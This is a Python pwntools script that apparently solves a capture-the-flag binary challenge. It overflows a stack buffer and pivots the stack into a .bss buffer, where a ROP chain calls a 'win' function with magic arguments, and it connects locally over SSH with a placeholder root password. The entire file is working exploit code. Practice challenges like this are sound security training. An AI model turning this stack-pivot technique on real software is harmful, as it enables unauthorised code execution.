from pwn import *

VM_HOST, VM_PORT = "192.168.10.135", 22
HOST, PORT = "addr", 1234
cwd = "/root/workbench/PWN/pwn07/p01/"

exe = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = exe
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        sh = ssh(host=VM_HOST, port=VM_PORT, user="root", password="password")
        p = sh.process([f"{cwd}/chall"], cwd=cwd)
        gdb.attach(p)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    # === Alias === #
    p = conn()
    s = p.send
    sl = p.sendline
    sa = p.sendafter
    sla = p.sendlineafter
    r = p.recv
    rn = p.recvn
    rl = p.recvline
    ru = p.recvuntil
    # === Exploit === #
    log.info("happy pwn!")
    rop = ROP(exe)
    ret = rop.find_gadget(["ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
    leave_ret = rop.find_gadget(["leave", "ret"])[0]
    win = exe.sym.win
    log.success(f"win = {hex(win)}")
    fake_stack = exe.sym.fake_stack
    log.success(f"fake_stack = {hex(fake_stack)}")
    pivot_offset = 0xE00
    pivot = fake_stack + pivot_offset
    pay = flat({pivot_offset: [0x0, pop_rdi, 0xDECAFBADCAFEBABE, pop_rsi, 0xDDBA11FEEDC0DE, ret, win]})
    sla(b"stage1(.bss)> ", pay)
    pay = flat(b"A" * 0x20, pivot, leave_ret)
    sla(b"stage2(stack)> ", pay)
    # =============== #
    p.interactive()

if __name__ == "__main__":
    main()
